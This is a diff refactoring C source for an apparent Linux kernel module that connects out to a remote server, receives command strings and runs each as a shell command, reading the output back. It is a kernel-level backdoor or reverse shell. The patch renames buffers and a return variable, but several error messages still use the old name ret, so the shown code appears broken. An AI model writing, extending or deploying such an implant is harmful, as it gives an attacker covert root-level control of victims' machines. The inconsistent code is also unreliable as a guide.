@@ -18,7 +18,8 @@
 
 #define MAX_SENDING_MSG_ATTEMPTS 10
 #define TIMEOUT_BEFORE_RETRY 1000
-#define RECEIVED_BUFFER_SIZE 1024
+#define RCV_CMD_BUFFER_SIZE 1024
+#define STD_BUFFER_SIZE 4096
 
 static struct socket *sock = NULL;
 static struct task_struct *network_thread = NULL;
@@ -76,11 +77,11 @@ static int exec_str_as_command(char *user_cmd)
 	loff_t pos = 0;
 	int status = 0, len = 0;
 
-	cmd = kmalloc(4096, GFP_KERNEL);
+	cmd = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
 	if (!cmd)
 		return -ENOMEM;
 
-	snprintf(cmd, 4096, "%s > %s 2>&1", user_cmd, output_file);
+	snprintf(cmd, RCV_CMD_BUFFER_SIZE, "%s > %s 2>&1", user_cmd, output_file);
 	argv[2] = cmd;
 
 	pr_info("exec_str_as_command: executing command: %s\n", cmd);
@@ -103,14 +104,14 @@ static int exec_str_as_command(char *user_cmd)
 		return -ENOENT;
 	}
 
-	buf = kmalloc(4096, GFP_KERNEL);
+	buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
 	if (!buf) {
 		filp_close(file, NULL);
 		kfree(cmd);
 		return -ENOMEM;
 	}
 
-	len = kernel_read(file, buf, 4096 - 1, &pos);
+	len = kernel_read(file, buf, STD_BUFFER_SIZE - 1, &pos);
 	if (len >= 0) {
 		buf[len] = '\0';
 		pr_info("exec_str_as_command: command output:\n%s", buf);
@@ -129,7 +130,7 @@ static int network_worker(void *data)
 	struct msghdr msg = { 0 };
 	struct kvec vec = { 0 };
 	unsigned char ip_binary[4] = { 0 };
-	int ret = 0;
+	int ret_code = 0;
 
 	// Validate the IP address
 	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
@@ -138,8 +139,8 @@ static int network_worker(void *data)
 	}
 
 	// Create a socket
-	ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
-	if (ret < 0) {
+	ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
+	if (ret_code < 0) {
 		pr_err("network_worker: socket creation failed: %d\n", ret);
 		return FAILURE;
 	}
@@ -152,8 +153,8 @@ static int network_worker(void *data)
 	// Connect to the server 
 	// Retry until successful or thread is stopped
 	while (!kthread_should_stop()) {
-		ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
-		if (ret < 0) {
+		ret_code = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
+		if (ret_code < 0) {
 			pr_err("network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			continue;
@@ -166,17 +167,17 @@ static int network_worker(void *data)
 
 	int attempts = 0;
 	do {
-		ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-		if (ret < 0) {
+		ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+		if (ret_code < 0) {
 			pr_err("network_worker: failed to send message: %d, retrying... (attempt %d/%d)\n", ret, attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			attempts++;
 		}
-	} while (ret < 0 && attempts < MAX_SENDING_MSG_ATTEMPTS);
+	} while (ret_code < 0 && attempts < MAX_SENDING_MSG_ATTEMPTS);
 
 	// Case where connexion is set up but message failed to be sent
 	// Usually when the module is unmonted before the message is sent
-	if (ret < 0) {
+	if (ret_code < 0) {
 		pr_err("network_worker: failed to send message after 10 attempts, giving up.\n");
 		return FAILURE;
 	}
@@ -188,14 +189,14 @@ static int network_worker(void *data)
 	while (!kthread_should_stop()) {
 		struct kvec recv_vec;
 		struct msghdr recv_msg = { 0 };
-		char recv_buffer[RECEIVED_BUFFER_SIZE] = { 0 };
+		char recv_buffer[RCV_CMD_BUFFER_SIZE] = { 0 };
 
 		recv_vec.iov_base = recv_buffer;
 		recv_vec.iov_len = sizeof(recv_buffer) - 1;
 
 		// Wait for a message from the server
-		ret = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
-		if (ret < 0) {
+		ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
+		if (ret_code < 0) {
 			pr_err("network_worker: error receiving message: %d\n", ret);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			continue;
